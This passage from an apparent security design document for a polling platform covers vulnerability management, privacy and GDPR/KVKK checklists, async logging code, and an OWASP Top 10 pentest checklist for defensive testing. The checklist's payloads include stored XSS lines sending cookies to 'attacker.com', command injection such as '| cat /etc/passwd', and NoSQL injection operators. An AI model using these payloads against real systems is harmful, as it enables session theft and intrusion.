      scope: "Full application",
      provider: "Third-party security firm"
    },
    CODE_REVIEW: {
      securityFocus: "All authentication/authorization changes",
      reviewer: "Security-trained developer"
    }
  },

  BUG_BOUNTY: {
    enabled: true,
    scope: "*.voxpoll.com",
    exclusions: ["DoS", "Social engineering", "Physical attacks"],
    rewards: {
      critical: "$1000-$5000",
      high: "$500-$1000",
      medium: "$100-$500",
      low: "$50-$100"
    }
  }
}

export { SECURITY_TESTING_PROGRAM }
```

## 17.11.2 Vulnerability Management

```typescript
const VULNERABILITY_MANAGEMENT = {
  SEVERITY_LEVELS: {
    CRITICAL: {
      sla: "24 hours",
      action: "Immediate patch or mitigation"
    },
    HIGH: {
      sla: "7 days",
      action: "Prioritize fix"
    },
    MEDIUM: {
      sla: "30 days",
      action: "Schedule fix"
    },
    LOW: {
      sla: "90 days",
      action: "Fix in regular release cycle"
    }
  },

  PROCESS: {
    identification: "Automated + Manual",
    triage: "Security team",
    prioritization: "Based on severity and exploitability",
    remediation: "Development team",
    verification: "Security team",
    disclosure: "Responsible disclosure after fix"
  }
}

export { VULNERABILITY_MANAGEMENT }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.12 PRIVACY BY DESIGN
# ══════════════════════════════════════════════════════════════════════════════

## 17.12.1 Privacy by Design Principles

```typescript
const PRIVACY_BY_DESIGN = {
  PRINCIPLES: {
    PROACTIVE: {
      description: "Anticipate and prevent privacy issues",
      implementation: "Privacy impact assessments before features"
    },
    DEFAULT: {
      description: "Privacy as the default setting",
      implementation: [
        "Profile private by default for minors",
        "Minimal data collection",
        "Opt-in for data sharing"
      ]
    },
    EMBEDDED: {
      description: "Privacy embedded into design",
      implementation: [
        "Anonymization by design",
        "Encryption by default",
        "Access controls built-in"
      ]
    },
    POSITIVE_SUM: {
      description: "Full functionality with privacy",
      implementation: "Privacy doesn't degrade user experience"
    },
    END_TO_END: {
      description: "Security throughout data lifecycle",
      implementation: [
        "Secure collection",
        "Secure processing",
        "Secure storage",
        "Secure deletion"
      ]
    },
    VISIBILITY: {
      description: "Keep it open and transparent",
      implementation: [
        "Clear privacy policy",
        "Data access tools",
        "Processing transparency"
      ]
    },
    USER_CENTRIC: {
      description: "Respect user privacy",
      implementation: [
        "User controls",
        "Consent management",
        "Easy data export/deletion"
      ]
    }
  }
}

export { PRIVACY_BY_DESIGN }
```

## 17.12.2 Privacy Impact Assessment

```typescript
const PRIVACY_IMPACT_ASSESSMENT = {
  WHEN_REQUIRED: [
    "New feature collecting personal data",
    "New third-party integration",
    "Changes to data processing",
    "New analytics implementation",
    "Cross-border data transfer"
  ],

  ASSESSMENT_CRITERIA: {
    dataCollected: "What personal data is collected?",
    necessity: "Is all collected data necessary?",
    legalBasis: "What is the legal basis for processing?",
    storage: "How and where is data stored?",
    retention: "How long is data retained?",
    access: "Who has access to the data?",
    sharing: "Is data shared with third parties?",
    security: "What security measures are in place?",
    userRights: "How are user rights supported?",
    risks: "What are the privacy risks?",
    mitigations: "How are risks mitigated?"
  },

  APPROVAL: {
    lowRisk: "Development team lead",
    mediumRisk: "Security team review",
    highRisk: "DPO approval required"
  }
}

export { PRIVACY_IMPACT_ASSESSMENT }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.13 COMPLIANCE CHECKLIST
# ══════════════════════════════════════════════════════════════════════════════

## 17.13.1 GDPR Compliance Checklist

```typescript
const GDPR_CHECKLIST = {
  DOCUMENTATION: [
    { item: "Privacy policy published", status: "REQUIRED" },
    { item: "Cookie policy published", status: "REQUIRED" },
    { item: "Data processing records maintained", status: "REQUIRED" },
    { item: "DPO appointed (if applicable)", status: "CONDITIONAL" },
    { item: "Data processor agreements in place", status: "REQUIRED" }
  ],

  CONSENT: [
    { item: "Consent mechanism implemented", status: "REQUIRED" },
    { item: "Consent records maintained", status: "REQUIRED" },
    { item: "Consent withdrawal mechanism", status: "REQUIRED" },
    { item: "Cookie consent banner", status: "REQUIRED" }
  ],

  DATA_SUBJECT_RIGHTS: [
    { item: "Access request mechanism", status: "REQUIRED" },
    { item: "Data portability export", status: "REQUIRED" },
    { item: "Deletion request mechanism", status: "REQUIRED" },
    { item: "Rectification mechanism", status: "REQUIRED" }
  ],

  SECURITY: [
    { item: "Encryption at rest", status: "REQUIRED" },
    { item: "Encryption in transit", status: "REQUIRED" },
    { item: "Access controls implemented", status: "REQUIRED" },
    { item: "Breach notification process", status: "REQUIRED" },
    { item: "Regular security testing", status: "REQUIRED" }
  ]
}

export { GDPR_CHECKLIST }
```

## 17.13.2 KVKK Compliance Checklist

```typescript
const KVKK_CHECKLIST = {
  REGISTRATION: [
    { item: "VERBİS registration completed", status: "REQUIRED" },
    { item: "VERBİS information up to date", status: "REQUIRED" }
  ],

  DOCUMENTATION: [
    { item: "Aydınlatma metni (Turkish)", status: "REQUIRED" },
    { item: "Açık rıza formu (Turkish)", status: "REQUIRED" },
    { item: "Gizlilik politikası (Turkish)", status: "REQUIRED" },
    { item: "Çerez politikası (Turkish)", status: "REQUIRED" },
    { item: "Veri saklama politikası", status: "REQUIRED" }
  ],

  DATA_HANDLING: [
    { item: "Explicit consent for all processing", status: "REQUIRED" },
    { item: "Special category data safeguards", status: "CONDITIONAL" },
    { item: "Cross-border transfer consent", status: "REQUIRED" },
    { item: "Data localization compliance", status: "REQUIRED" }
  ],

  RIGHTS: [
    { item: "Right to information implemented", status: "REQUIRED" },
    { item: "30-day response SLA", status: "REQUIRED" },
    { item: "Free-of-charge first request", status: "REQUIRED" }
  ],

  SECURITY: [
    { item: "Technical security measures", status: "REQUIRED" },
    { item: "Administrative security measures", status: "REQUIRED" },
    { item: "72-hour breach notification", status: "REQUIRED" }
  ]
}

export { KVKK_CHECKLIST }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.14 ASYNC ERROR LOGGING ARCHITECTURE
# ══════════════════════════════════════════════════════════════════════════════

## 17.14.1 Problem Statement

Synchronous error logging (`console.error(JSON.stringify(entry))`) blocks the
response cycle and creates latency under load. Solution: async logging queue
with non-blocking writes.

## 17.14.2 Async Logging Queue Implementation

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// ASYNC ERROR LOGGING - Non-blocking, queue-based logging
// ══════════════════════════════════════════════════════════════════════════════

import pino from "pino"
import { Redis } from "ioredis"

// Pino with async transport (non-blocking)
const logger = pino({
  level: process.env.LOG_LEVEL || "info",
  transport: {
    target: "pino/file",
    options: {
      destination: process.env.LOG_FILE || "/var/log/voxpoll/app.log",
      mkdir: true,
      sync: false  // CRITICAL: Async writes
    }
  },
  // Redact sensitive fields
  redact: {
    paths: [
      "password",
      "token",
      "authorization",
      "cookie",
      "email",
      "phone",
      "*.password",
      "*.token"
    ],
    censor: "[REDACTED]"
  }
})

// Error log entry structure
interface ErrorLogEntry {
  level: "error" | "warn" | "info"
  code: string
  message: string
  context: {
    userId?: string        // Hashed, not raw
    contentId?: string
    endpoint?: string
    method?: string
    userAgent?: string
    ip?: string            // Masked: 192.168.xxx.xxx
  }
  error?: {
    name: string
    message: string
    stack?: string         // Only in development
  }
  timestamp: string
  requestId: string
}

// ══════════════════════════════════════════════════════════════════════════════
// LOGGING QUEUE CONFIGURATION
// ══════════════════════════════════════════════════════════════════════════════

const LOGGING_CONFIG = {
  // Redis queue settings
  queue: {
    key: "queue:logs:errors",
    maxSize: 10000,          // Max entries before dropping oldest
    batchSize: 100,          // Process 100 entries at a time
    flushInterval: 5000      // 5 seconds between flushes
  },

  // Retention settings
  retention: {
    errorLogs: 90,           // 90 days for error logs
    securityLogs: 365 * 7,   // 7 years for security/audit logs
    accessLogs: 30           // 30 days for access logs
  },

  // Circuit breaker for logging failures
  circuitBreaker: {
    failureThreshold: 5,     // Open after 5 failures
    resetTimeout: 30000,     // 30 seconds before retry
    halfOpenRequests: 3      // Test with 3 requests
  },

  // Sampling for high-volume logs
  sampling: {
    enabled: true,
    rate: 0.1,               // Sample 10% of info logs
    alwaysLog: ["error", "warn", "security"]
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// NON-BLOCKING LOG FUNCTION
// ══════════════════════════════════════════════════════════════════════════════

class AsyncLogger {
  private redis: Redis
  private queue: ErrorLogEntry[] = []
  private circuitOpen: boolean = false
  private failureCount: number = 0
  private lastFailure: number = 0

  constructor(redis: Redis) {
    this.redis = redis
    this.startFlushWorker()
  }

  // Non-blocking log - adds to in-memory queue and returns immediately
  log(entry: ErrorLogEntry): void {
    // Check circuit breaker
    if (this.circuitOpen) {
      if (Date.now() - this.lastFailure > LOGGING_CONFIG.circuitBreaker.resetTimeout) {
        this.circuitOpen = false
        this.failureCount = 0
      } else {
        // Circuit open - drop log (or write to fallback)
        this.fallbackLog(entry)
        return
      }
    }

    // Sampling for non-critical logs
    if (
      LOGGING_CONFIG.sampling.enabled &&
      !LOGGING_CONFIG.sampling.alwaysLog.includes(entry.level) &&
      Math.random() > LOGGING_CONFIG.sampling.rate
    ) {
      return // Skip this log (sampled out)
    }

    // Add timestamp and request ID if missing
    entry.timestamp = entry.timestamp || new Date().toISOString()
    entry.requestId = entry.requestId || crypto.randomUUID()

    // Add to local queue (non-blocking)
    this.queue.push(entry)

    // Trim queue if too large
    if (this.queue.length > LOGGING_CONFIG.queue.maxSize) {
      this.queue.shift() // Drop oldest
    }
  }

  // Convenience methods
  error(code: string, message: string, context: ErrorLogEntry["context"], error?: Error): void {
    this.log({
      level: "error",
      code,
      message,
      context,
      error: error ? {
        name: error.name,
        message: error.message,
        stack: process.env.NODE_ENV === "development" ? error.stack : undefined
      } : undefined,
      timestamp: new Date().toISOString(),
      requestId: context.requestId || crypto.randomUUID()
    })
  }

  warn(code: string, message: string, context: ErrorLogEntry["context"]): void {
    this.log({
      level: "warn",
      code,
      message,
      context,
      timestamp: new Date().toISOString(),
      requestId: context.requestId || crypto.randomUUID()
    })
  }

  // Background worker - flushes queue to Redis/persistent storage
  private startFlushWorker(): void {
    setInterval(async () => {
      await this.flush()
    }, LOGGING_CONFIG.queue.flushInterval)
  }

  private async flush(): Promise<void> {
    if (this.queue.length === 0) return

    const batch = this.queue.splice(0, LOGGING_CONFIG.queue.batchSize)

    try {
      // Write to Redis queue for processing
      const pipeline = this.redis.pipeline()
      for (const entry of batch) {
        pipeline.lpush(LOGGING_CONFIG.queue.key, JSON.stringify(entry))
      }
      // Trim queue to max size
      pipeline.ltrim(LOGGING_CONFIG.queue.key, 0, LOGGING_CONFIG.queue.maxSize - 1)
      await pipeline.exec()

      // Also write to pino for immediate file logging
      for (const entry of batch) {
        logger[entry.level](entry, entry.message)
      }

      // Reset failure count on success
      this.failureCount = 0

    } catch (error) {
      // Put entries back in queue
      this.queue.unshift(...batch)

      // Update circuit breaker
      this.failureCount++
      this.lastFailure = Date.now()

      if (this.failureCount >= LOGGING_CONFIG.circuitBreaker.failureThreshold) {
        this.circuitOpen = true
        console.error("[LOGGING] Circuit breaker opened due to failures")
      }
    }
  }

  // Fallback when circuit is open
  private fallbackLog(entry: ErrorLogEntry): void {
    // Write to stderr as last resort (synchronous but only when circuit open)
    if (entry.level === "error") {
      console.error(`[FALLBACK] ${entry.code}: ${entry.message}`)
    }
  }

  // Graceful shutdown - flush remaining logs
  async shutdown(): Promise<void> {
    await this.flush()
    // Wait for any remaining writes
    await new Promise(resolve => setTimeout(resolve, 1000))
  }
}

// Singleton instance
let asyncLogger: AsyncLogger | null = null

export function getAsyncLogger(): AsyncLogger {
  if (!asyncLogger) {
    const redis = new Redis(process.env.REDIS_URL!)
    asyncLogger = new AsyncLogger(redis)
  }
  return asyncLogger
}

export { AsyncLogger, ErrorLogEntry, LOGGING_CONFIG }
```


## 17.14.3 Log Processing Worker

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// LOG PROCESSING WORKER - Processes queued logs for storage/alerting
// ══════════════════════════════════════════════════════════════════════════════

interface LogProcessorConfig {
  // External services
  sentryDsn?: string
  datadogApiKey?: string
  elasticUrl?: string

  // Alert thresholds
  alerts: {
    errorRateThreshold: number      // Errors per minute to trigger alert
    errorRateWindow: number         // Window in minutes
  }
}

class LogProcessor {
  private redis: Redis
  private config: LogProcessorConfig
  private errorCounts: Map<string, number[]> = new Map()

  async processQueue(): Promise<void> {
    const entries = await this.redis.lrange(
      LOGGING_CONFIG.queue.key,
      0,
      LOGGING_CONFIG.queue.batchSize - 1
    )

    if (entries.length === 0) return

    // Remove processed entries
    await this.redis.ltrim(
      LOGGING_CONFIG.queue.key,
      entries.length,
      -1
    )

    for (const entryJson of entries) {
      const entry: ErrorLogEntry = JSON.parse(entryJson)

      // Track error rates
      this.trackErrorRate(entry)

      // Route to appropriate destination
      await this.routeLog(entry)
    }

    // Check for alerts
    await this.checkAlerts()
  }

  private async routeLog(entry: ErrorLogEntry): Promise<void> {
    // Always write to Elasticsearch for search
    if (this.config.elasticUrl) {
      await this.sendToElastic(entry)
    }

    // Send errors to Sentry
    if (entry.level === "error" && this.config.sentryDsn) {
      await this.sendToSentry(entry)
    }

    // Send all logs to Datadog for metrics
    if (this.config.datadogApiKey) {
      await this.sendToDatadog(entry)
    }
  }

  private trackErrorRate(entry: ErrorLogEntry): void {
    if (entry.level !== "error") return

    const now = Date.now()
    const code = entry.code

    if (!this.errorCounts.has(code)) {
      this.errorCounts.set(code, [])
    }

    const timestamps = this.errorCounts.get(code)!
    timestamps.push(now)

    // Keep only timestamps within window
    const windowMs = this.config.alerts.errorRateWindow * 60 * 1000
    const cutoff = now - windowMs
    this.errorCounts.set(code, timestamps.filter(t => t > cutoff))
  }

  private async checkAlerts(): Promise<void> {
    for (const [code, timestamps] of this.errorCounts) {
      const rate = timestamps.length // Errors in window

      if (rate >= this.config.alerts.errorRateThreshold) {
        await this.sendAlert({
          type: "HIGH_ERROR_RATE",
          code,
          rate,
          window: this.config.alerts.errorRateWindow,
          timestamp: new Date().toISOString()
        })
      }
    }
  }

  private async sendAlert(alert: object): Promise<void> {
    // Send to PagerDuty, Slack, etc.
    console.warn("[ALERT]", JSON.stringify(alert))
  }

  private async sendToElastic(entry: ErrorLogEntry): Promise<void> {
    // Elasticsearch bulk insert
  }

  private async sendToSentry(entry: ErrorLogEntry): Promise<void> {
    // Sentry captureException
  }

  private async sendToDatadog(entry: ErrorLogEntry): Promise<void> {
    // Datadog logs API
  }
}

export { LogProcessor, LogProcessorConfig }
```


## 17.14.4 Usage in API Routes

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// USAGE EXAMPLE - Non-blocking error logging in API routes
// ══════════════════════════════════════════════════════════════════════════════

import { getAsyncLogger } from "@/lib/logging"

// In API route or server action
export async function submitVote(pollId: string, optionId: string) {
  const logger = getAsyncLogger()
  const requestId = crypto.randomUUID()

  try {
    // ... business logic

    return { success: true }

  } catch (error) {
    // Non-blocking error log - returns immediately
    logger.error(
      "VOTE_SUBMISSION_FAILED",
      `Failed to submit vote for poll ${pollId}`,
      {
        contentId: pollId,
        endpoint: "/api/polls/vote",
        method: "POST",
        requestId
      },
      error as Error
    )

    // Response is NOT blocked by logging
    return {
      success: false,
      error: { code: "VOTE_FAILED", message: "Unable to submit vote" }
    }
  }
}

// Graceful shutdown handler
process.on("SIGTERM", async () => {
  const logger = getAsyncLogger()
  await logger.shutdown()
  process.exit(0)
})
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.15 PENTEST CHECKLIST
# ══════════════════════════════════════════════════════════════════════════════

## 17.15.1 Penetration Testing Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      PENETRATION TESTING FRAMEWORK                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  TESTING PHASES:                                                            │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 1. RECONNAISSANCE    │ Information gathering, attack surface       │   │
│  │ 2. SCANNING          │ Vulnerability identification                │   │
│  │ 3. EXPLOITATION      │ Attempting to exploit vulnerabilities       │   │
│  │ 4. POST-EXPLOITATION │ Privilege escalation, lateral movement      │   │
│  │ 5. REPORTING         │ Documentation of findings                   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  TESTING SCHEDULE:                                                          │
│  • Internal: Monthly automated scans                                        │
│  • External: Quarterly manual penetration tests                             │
│  • Major Release: Pre-deployment security assessment                        │
│  • Annual: Comprehensive third-party audit                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 17.15.2 OWASP Top 10 Checklist

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// OWASP TOP 10 (2021) TESTING CHECKLIST
// ══════════════════════════════════════════════════════════════════════════════

const OWASP_TOP_10_CHECKLIST = {
  // ────────────────────────────────────────────────────────────────────────────
  // A01:2021 - BROKEN ACCESS CONTROL
  // ────────────────────────────────────────────────────────────────────────────
  A01_BROKEN_ACCESS_CONTROL: {
    description: "Restrictions on authenticated users are not properly enforced",
    tests: [
      {
        id: "A01-01",
        name: "IDOR - Direct Object Reference",
        method: "Attempt to access other users' resources by modifying IDs",
        targets: [
          "GET /api/polls/:pollId - Try accessing private polls",
          "GET /api/users/:userId/profile - Try accessing other profiles",
          "GET /api/dm/:conversationId - Try accessing others' DMs",
          "PUT /api/surveys/:surveyId - Try editing others' surveys"
        ],
        expectedResult: "403 Forbidden for unauthorized resources",
        voxpollControls: [
          "OwnershipService.verifyOwnership()",
          "contentVisibility checks",
          "userId from JWT, never from request body"
        ]
      },
      {
        id: "A01-02",
        name: "Privilege Escalation - Vertical",
        method: "Attempt to access admin functions as regular user",
        targets: [
          "POST /api/admin/users/ban - Admin-only endpoint",
          "DELETE /api/admin/content/:id - Admin content removal",
          "GET /api/admin/reports - Admin dashboard access",
          "PUT /api/admin/settings - System configuration"
        ],
        expectedResult: "403 Forbidden for non-admin users",
        voxpollControls: [
          "requireRole(['admin']) middleware",
          "RBAC enforcement on all admin routes"
        ]
      },
      {
        id: "A01-03",
        name: "Privilege Escalation - Horizontal",
        method: "Access peer users' data at same privilege level",
        targets: [
          "Modify poll options after voting started",
          "Delete comments on others' polls",
          "Edit survey responses after submission"
        ],
        expectedResult: "403 Forbidden for non-owner operations",
        voxpollControls: [
          "CreatorOnly middleware for content modification",
          "State machine prevents invalid transitions"
        ]
      },
      {
        id: "A01-04",
        name: "Force Browsing",
        method: "Access unlinked but guessable URLs",
        targets: [
          "/api/internal/* - Internal endpoints",
          "/api/debug/* - Debug endpoints (should not exist in prod)",
          "/.env, /config.json - Configuration files"
        ],
        expectedResult: "404 Not Found or 403 Forbidden",
        voxpollControls: [
          "No debug endpoints in production",
          "Static file serving restricted"
        ]
      },
      {
        id: "A01-05",
        name: "CORS Misconfiguration",
        method: "Check CORS headers for overly permissive settings",
        targets: [
          "Access-Control-Allow-Origin: *",
          "Access-Control-Allow-Credentials with wildcard origin"
        ],
        expectedResult: "Specific origins only, no wildcards with credentials",
        voxpollControls: [
          "CORS_ALLOWED_ORIGINS environment variable",
          "No wildcard with credentials"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A02:2021 - CRYPTOGRAPHIC FAILURES
  // ────────────────────────────────────────────────────────────────────────────
  A02_CRYPTOGRAPHIC_FAILURES: {
    description: "Failures related to cryptography leading to sensitive data exposure",
    tests: [
      {
        id: "A02-01",
        name: "TLS Configuration",
        method: "Check SSL/TLS configuration using SSL Labs or testssl.sh",
        targets: [
          "TLS version (must be 1.2+, prefer 1.3)",
          "Cipher suites (no weak ciphers)",
          "Certificate validity and chain",
          "HSTS header presence"
        ],
        expectedResult: "Grade A or A+ on SSL Labs",
        voxpollControls: [
          "TLS 1.3 enforced",
          "HSTS with 1-year max-age",
          "Certificate managed via Let's Encrypt"
        ]
      },
      {
        id: "A02-02",
        name: "Sensitive Data in Transit",
        method: "Intercept traffic to check for unencrypted sensitive data",
        targets: [
          "Login credentials",
          "Session tokens",
          "Personal information",
          "API keys"
        ],
        expectedResult: "All sensitive data encrypted in transit",
        voxpollControls: [
          "HTTPS-only (HTTP redirects to HTTPS)",
          "Secure cookie flag",
          "No sensitive data in URL parameters"
        ]
      },
      {
        id: "A02-03",
        name: "Password Storage",
        method: "Verify password hashing implementation",
        targets: [
          "Hashing algorithm (bcrypt/Argon2)",
          "Salt usage",
          "Work factor/cost",
          "No plaintext storage"
        ],
        expectedResult: "bcrypt with cost 12+ or Argon2id",
        voxpollControls: [
          "bcrypt with BCRYPT_ROUNDS=12",
          "Automatic salting by bcrypt"
        ]
      },
      {
        id: "A02-04",
        name: "Encryption at Rest",
        method: "Verify database and file encryption",
        targets: [
          "Database encryption (MongoDB encryption at rest)",
          "S3 bucket encryption",
          "Backup encryption",
          "Log file encryption"
        ],
        expectedResult: "AES-256 encryption for all data at rest",
        voxpollControls: [
          "MongoDB encrypted storage engine",
          "S3 SSE-S3 or SSE-KMS",
          "Encrypted EBS volumes"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A03:2021 - INJECTION
  // ────────────────────────────────────────────────────────────────────────────
  A03_INJECTION: {
    description: "User-supplied data is not validated, filtered, or sanitized",
    tests: [
      {
        id: "A03-01",
        name: "NoSQL Injection",
        method: "Inject NoSQL operators in input fields",
        payloads: [
          '{"$gt": ""}',
          '{"$ne": null}',
          '{"$where": "this.password == this.username"}',
          '{"$regex": ".*"}'
        ],
        targets: [
          "Login form - username/password fields",
          "Search queries",
          "Filter parameters",
          "Sort parameters"
        ],
        expectedResult: "Injection attempts rejected or sanitized",
        voxpollControls: [
          "Drizzle parameterized queries",
          "mongo-sanitize on all inputs",
          "Zod schema validation"
        ]
      },
      {
        id: "A03-02",
        name: "XSS - Reflected",
        method: "Inject scripts via URL parameters",
        payloads: [
          '<script>alert("XSS")</script>',
          '"><img src=x onerror=alert(1)>',
          "javascript:alert(1)",
          '<svg onload=alert(1)>'
        ],
        targets: [
          "Search results page",
          "Error messages reflecting input",
          "URL parameters displayed on page"
        ],
        expectedResult: "No script execution, input escaped",
        voxpollControls: [
          "React automatic escaping",
          "CSP header blocking inline scripts",
          "DOMPurify for any HTML rendering"
        ]
      },
      {
        id: "A03-03",
        name: "XSS - Stored",
        method: "Store malicious scripts in database via input fields",
        payloads: [
          '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>',
          '<img src="x" onerror="fetch(\'https://attacker.com/\'+document.cookie)">',
          "{{constructor.constructor('alert(1)')()}}"
        ],
        targets: [
          "Poll question/option text",
          "Survey descriptions",
          "Comment content",
          "User bio/profile fields",
          "Username display"
        ],
        expectedResult: "Stored content sanitized, no execution on render",
        voxpollControls: [
          "DOMPurify sanitization on input",
          "CSP blocking execution",
          "HttpOnly cookies (no cookie theft)"
        ]
      },
      {
        id: "A03-04",
        name: "Command Injection",
        method: "Inject OS commands via input fields",
        payloads: [
          "; ls -la",
          "| cat /etc/passwd",
          "$(whoami)",
          "`id`"
        ],
        targets: [
          "File upload filenames",
          "Export functionality",
          "Any field passed to shell commands"
        ],
        expectedResult: "No shell command execution",
        voxpollControls: [
          "No shell exec in application code",
          "Filename sanitization for uploads"
        ]
      },
      {
        id: "A03-05",
        name: "LDAP Injection",
        method: "N/A - VoxPoll does not use LDAP",
        expectedResult: "N/A",
        voxpollControls: ["No LDAP integration"]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A04:2021 - INSECURE DESIGN
  // ────────────────────────────────────────────────────────────────────────────
  A04_INSECURE_DESIGN: {
    description: "Missing or ineffective security controls",
    tests: [
      {
        id: "A04-01",
        name: "Business Logic Flaws - Voting",
        method: "Attempt to circumvent voting restrictions",
        targets: [
          "Vote multiple times on same poll",
          "Vote after poll has ended",
          "Change vote when not allowed",
          "Vote on private poll without access"
        ],
        expectedResult: "All invalid voting attempts rejected",
        voxpollControls: [
          "One vote per user per poll (DB unique constraint)",
          "Poll status check before vote",
          "voteChangeAllowed flag enforcement"
        ]
      },
      {
        id: "A04-02",
        name: "Business Logic Flaws - Surveys",
        method: "Attempt to circumvent survey restrictions",
        targets: [
          "Submit survey multiple times",
          "Submit after deadline",
          "Skip required questions",
          "Submit invalid option values"
        ],
        expectedResult: "All invalid submissions rejected",
        voxpollControls: [
          "submissionLimit enforcement",
          "Deadline check before submission",
          "Required field validation",
          "Option value validation against schema"
        ]
      },
      {
        id: "A04-03",
        name: "Rate Limiting Bypass",
        method: "Attempt to bypass rate limits",
        targets: [
          "X-Forwarded-For header manipulation",
          "Distributed requests from multiple IPs",
          "Slowloris-style slow requests"
        ],
        expectedResult: "Rate limits enforced regardless of bypass attempts",
        voxpollControls: [
          "Rate limit by authenticated userId when available",
          "Trust proxy configured correctly",
          "Request timeout enforcement"
        ]
      },
      {
        id: "A04-04",
        name: "Mass Assignment",
        method: "Attempt to set privileged fields via request",
        payloads: [
          '{"username": "hacker", "role": "admin"}',
          '{"email": "test@test.com", "isVerified": true}',
          '{"pollId": "123", "voteCount": 9999}'
        ],
        targets: [
          "User registration",
          "Profile update",
          "Content creation"
        ],
        expectedResult: "Only allowed fields accepted",
        voxpollControls: [
          "Zod schema picks only allowed fields",
          "Explicit field selection in Drizzle"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A05:2021 - SECURITY MISCONFIGURATION
  // ────────────────────────────────────────────────────────────────────────────
  A05_SECURITY_MISCONFIGURATION: {
    description: "Missing or incorrectly configured security settings",
    tests: [
      {
        id: "A05-01",
        name: "Security Headers",
        method: "Check presence and values of security headers",
        targets: [
          "Content-Security-Policy",
          "X-Content-Type-Options: nosniff",
          "X-Frame-Options: DENY",
          "Strict-Transport-Security",
          "X-XSS-Protection: 0 (deprecated, CSP used)",
          "Referrer-Policy",
          "Permissions-Policy"
        ],
        expectedResult: "All security headers present with correct values",
        voxpollControls: [
          "Helmet.js middleware",
          "Custom CSP configuration"
        ]
      },
      {
        id: "A05-02",
        name: "Error Handling",
        method: "Trigger errors and check responses",
        targets: [
          "Stack traces in error responses",
          "Database error details",
          "Internal paths exposed",
          "Verbose error messages"
        ],
        expectedResult: "Generic error messages, no sensitive info",
        voxpollControls: [
          "Global error handler",
          "NODE_ENV=production disables stack traces",
          "Generic client error messages"
        ]
      },
      {
        id: "A05-03",
        name: "Default Credentials",
        method: "Check for default or weak credentials",
        targets: [
          "Admin accounts",
          "Database connections",
          "Redis connections",
          "Third-party service integrations"
        ],
        expectedResult: "No default credentials, all changed from defaults",
        voxpollControls: [
          "No default admin account",
          "Environment-specific credentials",
          "Secrets manager for production"
        ]
      },
      {
        id: "A05-04",
        name: "Unnecessary Features",
        method: "Check for exposed debug/development features",
        targets: [
          "Debug endpoints",
          "GraphQL introspection in production",
          "Swagger UI in production (if not intended)",
          "phpMyAdmin, MongoDB Express"
        ],
        expectedResult: "No unnecessary features exposed in production",
        voxpollControls: [
          "DEBUG=false in production",
          "No debug routes compiled in prod build"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A06:2021 - VULNERABLE AND OUTDATED COMPONENTS
  // ────────────────────────────────────────────────────────────────────────────
  A06_VULNERABLE_COMPONENTS: {
    description: "Using components with known vulnerabilities",
    tests: [
      {
        id: "A06-01",
        name: "Dependency Vulnerability Scan",
        method: "Run npm audit and other scanners",
        tools: [
          "npm audit",
          "snyk test",
          "OWASP Dependency-Check",
          "Renovate/Dependabot"
        ],
        expectedResult: "No high/critical vulnerabilities",
        voxpollControls: [
          "npm audit in CI pipeline",
          "Dependabot enabled",
          "Weekly dependency updates"
        ]
      },
      {
        id: "A06-02",
        name: "Outdated Framework Versions",
        method: "Check framework and runtime versions",
        targets: [
          "Node.js version (should be LTS)",
          "React version",
          "Express version",
          "MongoDB driver version"
        ],
        expectedResult: "All components on supported versions",
        voxpollControls: [
          "Node.js LTS (20.x)",
          "Latest stable React",
          "engines field in package.json"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A07:2021 - IDENTIFICATION AND AUTHENTICATION FAILURES
  // ────────────────────────────────────────────────────────────────────────────
  A07_AUTH_FAILURES: {
    description: "Authentication and session management flaws",
    tests: [
      {
        id: "A07-01",
        name: "Brute Force - Login",
        method: "Attempt multiple failed logins",
        targets: [
          "POST /api/auth/login",
          "POST /api/auth/verify-otp",
          "POST /api/auth/reset-password"
        ],
        expectedResult: "Account lockout after failed attempts",
        voxpollControls: [
          "5 failed attempts → 15 min lockout",
          "Rate limiting: 10 req/min on auth endpoints",
          "Progressive delays"
        ]
      },
      {
        id: "A07-02",
        name: "Credential Stuffing",
        method: "Use known breached credentials",
        expectedResult: "Detection and blocking of automated attempts",
        voxpollControls: [
          "Rate limiting by IP and fingerprint",
          "CAPTCHA after 3 failed attempts",
          "Breach password check (HaveIBeenPwned API)"
        ]
      },
      {
        id: "A07-03",
        name: "Session Fixation",
        method: "Attempt to set session ID before authentication",
        expectedResult: "New session ID issued after login",
        voxpollControls: [
          "JWT-based (no server session IDs)",
          "New tokens issued on login",
          "Old tokens invalidated on logout"
        ]
      },
      {
        id: "A07-04",
        name: "Session Hijacking",
        method: "Attempt to steal and reuse session tokens",
        targets: [
          "XSS to steal tokens",
          "Token in URL",
          "Token in logs"
        ],
        expectedResult: "Tokens protected from theft",
        voxpollControls: [
          "HttpOnly cookies for refresh token",
          "Short-lived access tokens (15 min)",
          "Token not logged or in URLs"
        ]
      },
      {
        id: "A07-05",
        name: "Password Policy Bypass",
        method: "Attempt to set weak passwords",
        payloads: [
          "123456",
          "password",
          "qwerty",
          "a" // Too short
        ],
        expectedResult: "Weak passwords rejected",
        voxpollControls: [
          "Min 8 chars, complexity requirements",
          "Common password blacklist",
          "Zxcvbn strength check"
        ]
      },
      {
        id: "A07-06",
        name: "MFA Bypass",
        method: "Attempt to bypass MFA",
        targets: [
          "Skip MFA step in flow",
          "Brute force OTP",
          "Reuse old OTP",
          "Response manipulation"
        ],
        expectedResult: "MFA cannot be bypassed",
